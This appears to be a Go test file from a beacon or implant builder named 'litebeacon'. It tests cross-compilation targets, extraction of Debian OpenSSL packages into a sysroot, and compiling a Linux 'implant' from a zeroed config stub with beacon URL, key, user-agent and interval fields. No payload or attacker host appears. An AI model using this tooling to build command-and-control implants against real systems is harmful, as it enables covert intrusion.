package litebeacon

import (
	"archive/tar"
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/ulikunitz/xz"
)

func TestLinuxOpenSSLTargets(t *testing.T) {
	arm, err := zigSpec("linux", "arm64")
	if err != nil {
		t.Fatal(err)
	}
	if arm.triple != "aarch64-linux-gnu.2.36" || !arm.openssl {
		t.Fatalf("arm64 spec: %+v", arm)
	}
	amd, err := zigSpec("linux", "amd64")
	if err != nil {
		t.Fatal(err)
	}
	if amd.triple != "x86_64-linux-gnu.2.36" || !amd.openssl {
		t.Fatalf("amd64 spec: %+v", amd)
	}
	url := opensslDebURL("libssl3", "arm64")
	if url != "https://deb.debian.org/debian/pool/main/o/openssl/libssl3_3.0.20-1~deb12u2_arm64.deb" {
		t.Fatal(url)
	}
	if _, err := linuxSSLArchOf("386"); err == nil {
		t.Fatal("386 should not have a linux openssl sysroot")
	}
}

func TestExtractDebInstallsHeadersAndSharedLibs(t *testing.T) {
	deb := filepath.Join(t.TempDir(), "libssl.deb")
	if err := os.WriteFile(deb, syntheticOpenSSLDeb(t), 0o644); err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	if err := extractDeb(deb, root); err != nil {
		t.Fatal(err)
	}
	dest := t.TempDir()
	if err := installOpenSSLTree(root, dest, "aarch64-linux-gnu"); err != nil {
		t.Fatal(err)
	}
	conf, err := os.ReadFile(filepath.Join(dest, "include", "openssl", "opensslconf.h"))
	if err != nil || string(conf) != "arch\n" {
		t.Fatalf("opensslconf = %q, %v", conf, err)
	}
	ssl, err := os.ReadFile(filepath.Join(dest, "include", "openssl", "ssl.h"))
	if err != nil || string(ssl) != "ssl\n" {
		t.Fatalf("ssl.h = %q, %v", ssl, err)
	}
	target, err := os.Readlink(filepath.Join(dest, "lib", "libssl.so"))
	if err != nil || target != "libssl.so.3" {
		t.Fatalf("libssl.so -> %q, %v", target, err)
	}
	body, err := os.ReadFile(filepath.Join(dest, "lib", "libssl.so.3"))
	if err != nil || string(body) != "shared" {
		t.Fatalf("libssl.so.3 = %q, %v", body, err)
	}
}

func syntheticOpenSSLDeb(t *testing.T) []byte {
	t.Helper()
	var tarBuf bytes.Buffer
	xw, err := xz.NewWriter(&tarBuf)
	if err != nil {
		t.Fatal(err)
	}
	tw := tar.NewWriter(xw)
	files := []struct {
		name string
		body string
		link string
		mode byte
	}{
		{name: "usr/include/openssl/ssl.h", body: "ssl\n", mode: tar.TypeReg},
		{name: "usr/include/openssl/opensslconf.h", body: "generic\n", mode: tar.TypeReg},
		{name: "usr/include/aarch64-linux-gnu/openssl/opensslconf.h", body: "arch\n", mode: tar.TypeReg},
		{name: "usr/lib/aarch64-linux-gnu/libssl.so.3", body: "shared", mode: tar.TypeReg},
		{name: "usr/lib/aarch64-linux-gnu/libssl.so", link: "libssl.so.3", mode: tar.TypeSymlink},
		{name: "usr/lib/aarch64-linux-gnu/libssl.a", body: "static-skip", mode: tar.TypeReg},
	}
	for _, file := range files {
		hdr := &tar.Header{Name: file.name, Mode: 0o644, Typeflag: file.mode}
		if file.mode == tar.TypeSymlink {
			hdr.Linkname = file.link
		} else {
			hdr.Size = int64(len(file.body))
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if file.mode == tar.TypeReg {
			if _, err := tw.Write([]byte(file.body)); err != nil {
				t.Fatal(err)
			}
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := xw.Close(); err != nil {
		t.Fatal(err)
	}
	payload := tarBuf.Bytes()
	var deb bytes.Buffer
	deb.WriteString("!<arch>\n")
	writeArMember(&deb, "debian-binary", []byte("2.0\n"))
	writeArMember(&deb, "data.tar.xz", payload)
	return deb.Bytes()
}

func writeArMember(w *bytes.Buffer, name string, data []byte) {
	if len(name) > 15 {
		panic(name)
	}
	fmt.Fprintf(w, "%-16s%-12d%-6d%-6d%-8o%-10d`\n", name+"/", 0, 0, 0, 0644, len(data))
	w.Write(data)
	if len(data)%2 == 1 {
		w.WriteByte('\n')
	}
}

func TestLinuxImplantLinksOpenSSL(t *testing.T) {
	if os.Getenv("LITE_OPENSSL_LINK") != "1" {
		t.Skip("set LITE_OPENSSL_LINK=1 to download Debian libssl and link")
	}
	cfg := `#define CFG_XOR 0
#define CFG_URL_LEN 1
static const unsigned char CFG_URL[1] = {0};
#define CFG_KEY_LEN 32
static const unsigned char CFG_KEY[32] = {0};
#define CFG_JSON_KEY_LEN 1
static const unsigned char CFG_JSON_KEY[1] = {0};
#define CFG_UA_LEN 1
static const unsigned char CFG_UA[1] = {0};
#define CFG_INTERVAL 10
`
	for _, arch := range []string{"arm64", "amd64"} {
		data, err := compileImplant(cfg, "linux", arch, nil, "")
		if err != nil {
			t.Fatalf("%s: %v", arch, err)
		}
		if !bytes.Contains(data, []byte("libssl.so.3")) || !bytes.Contains(data, []byte("libcrypto.so.3")) {
			t.Fatalf("%s binary is not dynamically linked to OpenSSL (%d bytes)", arch, len(data))
		}
	}
}
